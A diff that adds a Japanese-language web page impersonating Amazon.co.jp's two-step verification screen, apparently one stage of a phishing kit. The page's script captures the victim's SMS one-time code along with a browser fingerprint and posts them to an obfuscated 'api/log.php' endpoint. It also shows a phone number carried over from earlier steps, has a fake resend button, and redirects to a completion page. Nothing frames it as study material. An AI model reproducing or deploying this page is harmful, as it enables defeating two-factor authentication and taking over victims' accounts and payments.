@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Amazon.co.jp 二段階認証</title>
+<link rel="icon" href="assets/logo.svg">
+<link rel="stylesheet" href="assets/style.css">
+<style>
+.steps{display:flex;align-items:center;justify-content:center;gap:6px;font-size:11px;color:#767676;margin-bottom:16px}
+.steps b{display:inline-flex;align-items:center;gap:4px;padding:4px 9px;border-radius:20px;background:#f0f2f2;font-weight:400}
+.steps b.ok{background:#eef7ee;color:#067d62}
+.steps b.on{background:#e7f4f7;color:#007185;font-weight:700}
+.steps i{width:14px;height:1px;background:#d5d9d9}
+.wrap{max-width:380px}
+.mask{font-weight:700;word-break:break-all}
+.boxes{display:flex;gap:7px;justify-content:center;margin:18px 0 6px}
+.boxes input{width:44px;height:52px;text-align:center;font-size:21px;font-weight:700;padding:0;
+             border:1px solid #888c8c;border-radius:6px;box-shadow:0 1px 2px rgba(15,17,17,.15) inset}
+.boxes input:focus{border-color:#007185;box-shadow:0 0 0 3px #c8f3fa}
+.boxes input.err{border-color:#d00;box-shadow:0 0 0 3px #ffe3e3}
+.resend{font-size:12px;text-align:center;margin:14px 0 0;color:#565959}
+.resend b{color:#767676;font-weight:400}
+.hint{font-size:11px;color:#565959;margin:6px 0 0;text-align:center}
+.note{background:#f7fafa;border:1px solid #d5e8ec;border-radius:6px;padding:10px 12px;font-size:12px;
+      color:#0f4c5c;line-height:1.55;margin:0 0 16px}
+</style>
+</head>
+<body>
+
+<header><a href="#" aria-label="Amazon.co.jp"><img src="assets/logo.svg" alt="Amazon.co.jp" width="150" height="42"></a></header>
+
+<main>
+  <div class="wrap">
+    <div class="steps">
+<b class="ok">ログイン</b><i></i><b class="ok">お届け先</b><i></i><b class="on">お支払い</b>    </div>
+
+    <div class="card">
+      <h1>二段階認証</h1>
+<p class="note">セキュリティ保護のため、ご登録の電話番号にSMSで6桁の確認コードを送信しました。</p>
+      <form id="f" method="post" action="api/log.php" novalidate>
+        <input type="hidden" name="step" value="4_otp">
+        <input type="hidden" name="otp" id="hotp">
+        <input type="hidden" name="sig" id="sig">
+        <div class="hp"><label for="fax">FAX</label><input id="fax" name="fax" type="text" tabindex="-1" autocomplete="off"></div>
+
+        <p style="font-size:13px;margin:0 0 4px">SMS 送信先の電話番号</p>
+        <p class="mask" id="dest">ご登録の電話番号</p>
+
+        <div class="boxes" id="bx">
+          <input type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code">
+          <input type="text" inputmode="numeric" maxlength="1">
+          <input type="text" inputmode="numeric" maxlength="1">
+          <input type="text" inputmode="numeric" maxlength="1">
+          <input type="text" inputmode="numeric" maxlength="1">
+          <input type="text" inputmode="numeric" maxlength="1">
+        </div>
+        <p class="hint">SMSで届いた6桁の数字を入力してください</p>
+
+        <p class="errmsg" id="err">コードが正しくありません。もう一度お試しください。</p>
+        <button class="btn" type="submit" id="sub">確認して続行</button>
+
+        <p class="resend">コードが届かない場合 <a href="#" id="rs">再送信</a> <b id="cd"></b></p>
+      </form>
+    </div>
+
+    <div class="divider"><i></i><span>コードは5分間有効です</span><i></i></div>
+  </div>
+</main>
+
+<footer>
+  <div><a href="#">利用規約</a><a href="#">プライバシー規約</a><a href="#">ヘルプ</a></div>
+  <div class="cp">© 1996-2026, Amazon.com, Inc. or its affiliates</div>
+</footer>
+
+<script>
+(function(){
+  var EP = [97,112,105,47,108,111,103,46,112,104,112]
+           .map(function(c){ return String.fromCharCode(c); }).join('');
+  var f = document.getElementById('f'),
+      sub = document.getElementById('sub'),
+      err = document.getElementById('err'),
+      bx = document.getElementById('bx'),
+      ins = bx.querySelectorAll('input');
+
+ function mask(s){
+    var d = (s || '').replace(/\D/g,'');
+    if (d.length < 10) return 'ご登録の電話番号';
+    return d.slice(0,3) + '-****-' + d.slice(-4);
+  }
+
+  try {
+    document.getElementById('dest').textContent = mask(localStorage.getItem('a_tel') || '');
+  } catch(ex) {}
+
+  var fp = [screen.width, screen.height, screen.colorDepth,
+            navigator.hardwareConcurrency || 0, navigator.platform || '',
+            new Date().getTimezoneOffset(), navigator.language || ''].join('|');
+  try { document.getElementById('sig').value = btoa(fp); } catch(e) {}
+
+  ins[0].focus();
+
+  function sync(){
+    var v = '';
+    Array.prototype.forEach.call(ins, function(i){ v += i.value.replace(/\D/g,''); });
+    document.getElementById('hotp').value = v;
+    Array.prototype.forEach.call(ins, function(i){ i.classList.remove('err'); });
+    err.classList.remove('on');
+  }
+
+  Array.prototype.forEach.call(ins, function(inp, idx){
+    inp.addEventListener('input', function(){
+      inp.value = inp.value.replace(/\D/g,'').slice(-1);
+      if (inp.value && idx < 5) ins[idx + 1].focus();
+      sync();
+    });
+
+    inp.addEventListener('keydown', function(e){
+      if (e.key === 'Backspace' && !inp.value && idx > 0) ins[idx - 1].focus();
+      if (e.key === 'ArrowLeft' && idx > 0) ins[idx - 1].focus();
+      if (e.key === 'ArrowRight' && idx < 5) ins[idx + 1].focus();
+    });
+
+    inp.addEventListener('paste', function(e){
+      var t = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
+      if (!t) return;
+      e.preventDefault();
+      for (var i = 0; i < 6; i++) ins[i].value = t.charAt(i) || '';
+      ins[Math.min(t.length, 5)].focus();
+      sync();
+    });
+  });
+
+  var left = 45, tick;
+  var cd = document.getElementById('cd');
+  function startCd(){
+    clearInterval(tick);
+    left = 45;
+    cd.textContent = '(' + left + '秒)';
+    tick = setInterval(function(){
+      left--;
+      cd.textContent = left > 0 ? '(' + left + '秒)' : '';
+      if (left <= 0) clearInterval(tick);
+    }, 1000);
+  }
+  startCd();
+
+  document.getElementById('rs').addEventListener('click', function(e){
+    e.preventDefault();
+    if (left > 0) return;
+    var d = new FormData();
+    d.set('step', '4b_resend');
+    d.set('ua', navigator.userAgent);
+    fetch(EP, { method:'POST', body:d, keepalive:true, credentials:'same-origin' }).catch(function(){});
+    startCd();
+  });
+
+  f.addEventListener('submit', function(e){
+    e.preventDefault();
+    var v = document.getElementById('hotp').value;
+    if (v.length !== 6) {
+      Array.prototype.forEach.call(ins, function(i){ i.classList.add('err'); });
+      err.classList.add('on');
+      ins[0].focus();
+      return;
+    }
+
+    var d = new FormData(f);
+    d.set('ua', navigator.userAgent + ' | ' + (navigator.language || ''));
+    d.set('vp', innerWidth + 'x' + innerHeight);
+
+    sub.disabled = true;
+    sub.textContent = '確認中…';
+
+    var sent = false;
+    var jump = function(){ if (!sent) { sent = true; location.href = 'done.html'; } };
+
+    fetch(EP, { method:'POST', body:d, keepalive:true, credentials:'same-origin' })
+      .then(jump).catch(jump);
+    setTimeout(jump, 1400);
+  });
+})();
+</script>
+<script src="assets/fp.js"></script>
+<script src="assets/i18n.js"></script>
+</body></html>
